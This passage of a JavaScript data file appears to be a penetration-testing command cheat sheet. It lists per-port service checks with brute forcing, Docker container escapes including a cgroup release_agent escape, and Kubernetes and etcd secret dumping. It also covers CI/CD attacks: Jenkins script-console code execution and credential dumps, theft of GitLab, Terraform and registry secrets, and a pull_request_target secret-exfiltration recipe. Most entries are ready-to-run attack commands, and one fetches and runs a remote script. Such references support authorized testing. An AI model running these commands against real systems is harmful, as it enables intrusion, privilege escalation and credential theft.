          { title: "Screenshot Current Terminal", cmd: "script -c 'cat /root/proof.txt && id && hostname && ip a' proof_output.txt", tags: ["tool"], desc: "Capture terminal output to a file for proof" },
          { title: "Archive Engagement Data", cmd: "tar czf engagement_$(date +%Y%m%d).tar.gz scans/ loot/ screenshots/ notes/", tags: ["tool"], desc: "Bundle all engagement data for reporting" }
        ]
      },
      {
        name: "Quick Service Checks",
        commands: [
          { title: "Port 21 — FTP Checks", cmds: ["nmap -sV -sC -p 21 <TARGET_IP>", "ftp <TARGET_IP>  # try anonymous:anonymous", "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>"], tags: ["essential"], desc: "FTP: version scan, anonymous access, brute force" },
          { title: "Port 22 — SSH Checks", cmds: ["nmap -sV -sC -p 22 <TARGET_IP>", "ssh-audit <TARGET_IP>", "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>"], tags: ["essential"], desc: "SSH: version scan, algorithm audit, brute force" },
          { title: "Port 25 — SMTP Checks", cmds: ["nmap -sV --script smtp-commands,smtp-enum-users,smtp-vuln* -p 25 <TARGET_IP>", "smtp-user-enum -M VRFY -U users.txt -t <TARGET_IP>"], tags: ["essential"], desc: "SMTP: commands, user enumeration, vulnerability scan" },
          { title: "Port 53 — DNS Checks", cmds: ["nmap -sV --script dns-nsid -p 53 <TARGET_IP>", "dig axfr <DOMAIN> @<TARGET_IP>", "dig any <DOMAIN> @<TARGET_IP>"], tags: ["essential"], desc: "DNS: zone transfer, full record enumeration" },
          { title: "Port 80/443 — HTTP(S) Checks", cmds: ["whatweb http://<TARGET_IP>", "nikto -h http://<TARGET_IP>", "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt"], tags: ["essential"], desc: "HTTP: technology identification, vuln scan, directory brute" },
          { title: "Port 110/995 — POP3 Checks", cmds: ["nmap -sV --script pop3-capabilities,pop3-ntlm-info -p 110 <TARGET_IP>", "# Connect: telnet <TARGET_IP> 110", "# USER <USER> / PASS <PASS>"], tags: ["tool"], desc: "POP3: capabilities, authentication testing" },
          { title: "Port 111 — NFS/RPC Checks", cmds: ["nmap -sV --script rpcinfo,nfs* -p 111 <TARGET_IP>", "showmount -e <TARGET_IP>", "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs -o nolock"], tags: ["essential"], desc: "NFS/RPC: share enumeration and mounting" },
          { title: "Port 135/139/445 — SMB Checks", cmds: ["nmap -sV --script smb-enum-shares,smb-enum-users,smb-vuln* -p 139,445 <TARGET_IP>", "smbclient -L //<TARGET_IP> -N", "enum4linux-ng -A <TARGET_IP>", "crackmapexec smb <TARGET_IP> -u '' -p '' --shares"], tags: ["essential"], desc: "SMB: share enum, user enum, vuln scan, null session" },
          { title: "Port 161 — SNMP Checks", cmds: ["snmpwalk -v2c -c public <TARGET_IP>", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <TARGET_IP>", "snmp-check <TARGET_IP>"], tags: ["essential"], desc: "SNMP: community string brute force and enumeration" },
          { title: "Port 389/636 — LDAP Checks", cmds: ["nmap -sV --script ldap-rootdse,ldap-search -p 389 <TARGET_IP>", "ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>'"], tags: ["essential"], desc: "LDAP: anonymous bind, base DN enumeration" },
          { title: "Port 1433 — MSSQL Checks", cmds: ["nmap -sV --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -p 1433 <TARGET_IP>", "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>", "crackmapexec mssql <TARGET_IP> -u <USER> -p <PASS> -q 'SELECT @@version'"], tags: ["essential"], desc: "MSSQL: info gathering, authentication, query execution" },
          { title: "Port 1521 — Oracle Checks", cmds: ["nmap -sV --script oracle-sid-brute -p 1521 <TARGET_IP>", "odat all -s <TARGET_IP> -p 1521"], tags: ["tool"], desc: "Oracle: SID brute force and ODAT enumeration" },
          { title: "Port 2049 — NFS Checks", cmds: ["showmount -e <TARGET_IP>", "nmap -sV --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 <TARGET_IP>"], tags: ["essential"], desc: "NFS: share listing and mount options" },
          { title: "Port 3306 — MySQL Checks", cmds: ["nmap -sV --script mysql-info,mysql-enum -p 3306 <TARGET_IP>", "mysql -h <TARGET_IP> -u root -p", "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>"], tags: ["essential"], desc: "MySQL: info, authentication, brute force" },
          { title: "Port 3389 — RDP Checks", cmds: ["nmap -sV --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <TARGET_IP>", "xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASS>"], tags: ["essential"], desc: "RDP: encryption check, MS12-020 vuln, connection test" },
          { title: "Port 5432 — PostgreSQL Checks", cmds: ["nmap -sV --script pgsql-brute -p 5432 <TARGET_IP>", "psql -h <TARGET_IP> -U postgres -W"], tags: ["tool"], desc: "PostgreSQL: brute force and connection test" },
          { title: "Port 5900 — VNC Checks", cmds: ["nmap -sV --script vnc-info,vnc-brute -p 5900 <TARGET_IP>", "vncviewer <TARGET_IP>::5900"], tags: ["tool"], desc: "VNC: version info, brute force, connection" },
          { title: "Port 5985 — WinRM Checks", cmds: ["nmap -sV -p 5985 <TARGET_IP>", "crackmapexec winrm <TARGET_IP> -u <USER> -p <PASS>", "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'"], tags: ["essential"], desc: "WinRM: authentication testing and shell access" },
          { title: "Port 6379 — Redis Checks", cmds: ["nmap -sV --script redis-info -p 6379 <TARGET_IP>", "redis-cli -h <TARGET_IP> INFO", "redis-cli -h <TARGET_IP> CONFIG GET *"], tags: ["essential"], desc: "Redis: info gathering, unauthenticated access, config dump" },
          { title: "Port 8080/8443 — Web App Checks", cmds: ["whatweb http://<TARGET_IP>:8080", "gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/dirb/common.txt", "# Check for: Tomcat Manager, Jenkins, Weblogic, JBoss"], tags: ["essential"], desc: "Web app servers: technology ID, directory enum, default creds" },
          { title: "Port 27017 — MongoDB Checks", cmds: ["nmap -sV --script mongodb-info,mongodb-databases -p 27017 <TARGET_IP>", "mongosh --host <TARGET_IP> --eval 'db.adminCommand({listDatabases:1})'"], tags: ["tool"], desc: "MongoDB: info gathering and unauthenticated database listing" }
        ]
      }
    ]
  },

  // ─── 23. Container & Infrastructure Testing ───
  {
    id: "container-cloud",
    name: "Container & Infrastructure Testing",
    icon: "🐳",
    description: "Test Docker, Kubernetes, and CI/CD pipeline security",
    subcategories: [
      {
        name: "Docker Enumeration & Escape",
        commands: [
          { title: "List Running Containers", cmd: "docker ps", tags: ["essential"], desc: "List all running Docker containers" },
          { title: "List All Containers", cmd: "docker ps -a", tags: ["essential"], desc: "List all containers including stopped ones" },
          { title: "List Docker Images", cmd: "docker images", tags: ["essential"], desc: "List all locally available Docker images" },
          { title: "Inspect Container Config", cmd: "docker inspect <CONTAINER_ID>", tags: ["essential"], desc: "View detailed configuration of a container including mounts and env vars" },
          { title: "Execute Command in Container", cmd: "docker exec -it <CONTAINER_ID> /bin/bash", tags: ["essential"], desc: "Get an interactive shell inside a running container" },
          { title: "Check if Inside Container", cmds: ["cat /proc/1/cgroup 2>/dev/null | grep -i docker", "ls -la /.dockerenv", "cat /proc/self/mountinfo | grep -i docker"], tags: ["essential"], desc: "Determine if the current shell is inside a Docker container" },
          { title: "Docker Socket Exploitation", cmds: ["# If /var/run/docker.sock is mounted:", "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json", "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host"], tags: ["essential"], desc: "Exploit mounted Docker socket to escape container" },
          { title: "Privileged Container Escape", cmds: ["mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape", "echo 1 > /tmp/escape/notify_on_release", "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)", "echo \"$host_path/exploit.sh\" > /tmp/escape/release_agent", "echo '#!/bin/sh' > /exploit.sh && echo '<COMMAND>' >> /exploit.sh && chmod +x /exploit.sh", "sh -c 'echo 0 > /tmp/escape/cgroup.procs'"], tags: ["advanced"], desc: "Escape a --privileged container via cgroups release_agent" },
          { title: "Mount Host Filesystem", cmd: "docker run -v /:/host -it <IMAGE> chroot /host", tags: ["essential"], desc: "Mount the host root filesystem into a new container" },
          { title: "nsenter Host Escape", cmd: "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash", tags: ["advanced"], desc: "Enter the host namespaces from a privileged container" },
          { title: "Check Container Capabilities", cmd: "capsh --print", tags: ["essential"], desc: "List current container capabilities for escape assessment" },
          { title: "Docker API Unauthenticated", cmd: "curl -s http://<TARGET_IP>:2375/containers/json | jq .", tags: ["essential"], desc: "Check for exposed Docker API without authentication" },
          { title: "Docker Secrets in Environment", cmd: "docker inspect <CONTAINER_ID> --format='{{range .Config.Env}}{{println .}}{{end}}'", tags: ["essential"], desc: "Extract environment variables that may contain secrets" },
          { title: "Escape via SYS_ADMIN Cap", cmds: ["mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp", "# If mount succeeds, SYS_ADMIN capability is available for escape"], tags: ["advanced"], desc: "Test and exploit SYS_ADMIN capability for container escape" },
          { title: "Deepce Container Escape Scanner", cmd: "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh && chmod +x deepce.sh && ./deepce.sh", tags: ["tool"], desc: "Automated Docker container escape detection tool" }
        ]
      },
      {
        name: "Kubernetes Reconnaissance",
        commands: [
          { title: "Get All Pods", cmd: "kubectl get pods --all-namespaces", tags: ["essential"], desc: "List all pods across all namespaces" },
          { title: "Get All Nodes", cmd: "kubectl get nodes -o wide", tags: ["essential"], desc: "List all cluster nodes with detailed info" },
          { title: "Get Secrets", cmd: "kubectl get secrets --all-namespaces", tags: ["essential"], desc: "List all secrets in the cluster" },
          { title: "Decode Secret", cmd: "kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key): \\(.value | @base64d)\"'", tags: ["essential"], desc: "Decode and view a Kubernetes secret's values" },
          { title: "Get ConfigMaps", cmd: "kubectl get configmaps --all-namespaces", tags: ["essential"], desc: "List all ConfigMaps that may contain sensitive configuration" },
          { title: "View ConfigMap Data", cmd: "kubectl get configmap <NAME> -n <NAMESPACE> -o yaml", tags: ["tool"], desc: "View ConfigMap contents including sensitive data" },
          { title: "Check Permissions", cmd: "kubectl auth can-i --list", tags: ["essential"], desc: "List all permissions for the current service account" },
          { title: "Check Cluster Admin", cmd: "kubectl auth can-i '*' '*' --all-namespaces", tags: ["essential"], desc: "Check if current identity has cluster-admin privileges" },
          { title: "Exec into Pod", cmd: "kubectl exec -it <POD_NAME> -n <NAMESPACE> -- /bin/bash", tags: ["essential"], desc: "Get an interactive shell in a running pod" },
          { title: "Copy File from Pod", cmd: "kubectl cp <NAMESPACE>/<POD_NAME>:/path/to/file ./local_file", tags: ["tool"], desc: "Copy a file from a pod to the local machine" },
          { title: "Get Service Accounts", cmd: "kubectl get serviceaccounts --all-namespaces", tags: ["tool"], desc: "List all service accounts in the cluster" },
          { title: "Get Cluster Role Bindings", cmd: "kubectl get clusterrolebindings -o wide", tags: ["tool"], desc: "List cluster role bindings to find privileged accounts" },
          { title: "Read Service Account Token", cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token", tags: ["essential"], desc: "Read the mounted service account token from within a pod" },
          { title: "Kubernetes API from Pod", cmd: "curl -sk https://kubernetes.default.svc/api/v1/namespaces/default/secrets -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"", tags: ["essential"], desc: "Query Kubernetes API using the mounted service account token" },
          { title: "Get Pod Security Policies", cmd: "kubectl get psp", tags: ["tool"], desc: "List Pod Security Policies to find misconfigurations" },
          { title: "Etcd Read Secrets", cmd: "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get / --prefix --keys-only", tags: ["advanced"], desc: "Enumerate etcd keys if etcd is accessible" },
          { title: "Etcd Dump Kubernetes Secrets", cmd: "ETCDCTL_API=3 etcdctl --endpoints=https://<ETCD_IP>:2379 --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca get /registry/secrets --prefix --print-value-only", tags: ["advanced"], desc: "Dump all Kubernetes secrets directly from etcd" },
          { title: "Create Privileged Pod", cmd: "kubectl run pwned --image=alpine --restart=Never --overrides='{\"spec\":{\"containers\":[{\"name\":\"pwned\",\"image\":\"alpine\",\"command\":[\"/bin/sh\"],\"stdin\":true,\"tty\":true,\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}'", tags: ["advanced"], desc: "Create a privileged pod mounting the host filesystem" }
        ]
      },
      {
        name: "CI/CD Pipeline Attacks",
        commands: [
          { title: "Jenkins Script Console RCE", cmd: "# Navigate to http://<TARGET_IP>:8080/script\n# Execute: println 'whoami'.execute().text", tags: ["essential"], desc: "Execute system commands via Jenkins Groovy Script Console" },
          { title: "Jenkins Credential Dump (Groovy)", cmd: "# In Script Console:\ndef creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null); creds.each { println it.username + ':' + it.password }", tags: ["essential"], desc: "Dump all stored credentials from Jenkins via Groovy" },
          { title: "Jenkins Decrypt Secret", cmd: "# In Script Console:\nprintln(hudson.util.Secret.decrypt('{<ENCRYPTED_SECRET>}'))", tags: ["essential"], desc: "Decrypt a Jenkins encrypted secret value" },
          { title: "Jenkins Remote Code Execution", cmd: "curl -X POST 'http://<TARGET_IP>:8080/scriptText' --data-urlencode 'script=println \"whoami\".execute().text' --user '<USER>:<PASS>'", tags: ["essential"], desc: "Execute Groovy script via Jenkins API remotely" },
          { title: "GitLab CI Token from Runner", cmds: ["# On a GitLab Runner, check for:", "cat /etc/gitlab-runner/config.toml", "# Look for 'token' field in [[runners]] section"], tags: ["essential"], desc: "Extract GitLab CI runner registration tokens" },
          { title: "GitLab CI Variables", cmd: "curl --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<GITLAB_URL>/api/v4/projects/<PROJECT_ID>/variables'", tags: ["essential"], desc: "List CI/CD variables (secrets) for a GitLab project" },
          { title: "GitHub Actions Secrets Exposure", cmds: ["# Check workflow files for secret references:", "# ${{ secrets.SECRET_NAME }}", "# Look for secrets leaked in logs or artifacts", "# Check .github/workflows/ for hardcoded values"], tags: ["essential"], desc: "Identify GitHub Actions secret exposure vectors" },
          { title: "GitHub Actions — Inject in PR", cmds: ["# If workflows trigger on pull_request_target:", "# Fork repo, modify workflow to echo secrets", "# Submit PR to trigger workflow on target repo"], tags: ["advanced"], desc: "Exploit pull_request_target for secret exfiltration", note: "Only in controlled/authorized testing scenarios" },
          { title: "Terraform State Secrets", cmds: ["# Check for remote state files:", "cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null or .secret_key != null)'", "# S3 state: aws s3 cp s3://<BUCKET>/terraform.tfstate ."], tags: ["essential"], desc: "Extract secrets from Terraform state files" },
          { title: "Terraform State from S3", cmd: "aws s3 ls s3://<BUCKET> --recursive | grep tfstate && aws s3 cp s3://<BUCKET>/terraform.tfstate /tmp/", tags: ["tool"], desc: "Download Terraform state file from S3 bucket" },
          { title: "ArgoCD Token Extraction", cmd: "kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d", tags: ["tool"], desc: "Extract ArgoCD initial admin password from Kubernetes" },
          { title: "Helm Release Secrets", cmd: "kubectl get secrets -l owner=helm --all-namespaces -o json | jq '.items[].data' | jq -r 'to_entries[] | .value' | base64 -d | gunzip 2>/dev/null", tags: ["advanced"], desc: "Decode Helm release secrets which may contain sensitive values" },
          { title: "CI/CD Environment Variables", cmds: ["env | sort", "printenv", "cat /proc/self/environ | tr '\\0' '\\n'"], tags: ["essential"], desc: "Dump all environment variables in CI/CD pipeline context" },
          { title: "Docker Registry Credentials", cmds: ["cat ~/.docker/config.json", "cat /root/.docker/config.json", "# Base64 decode the 'auth' field for credentials"], tags: ["tool"], desc: "Extract Docker registry credentials from config files" }
        ]
      }
    ]
  },
];
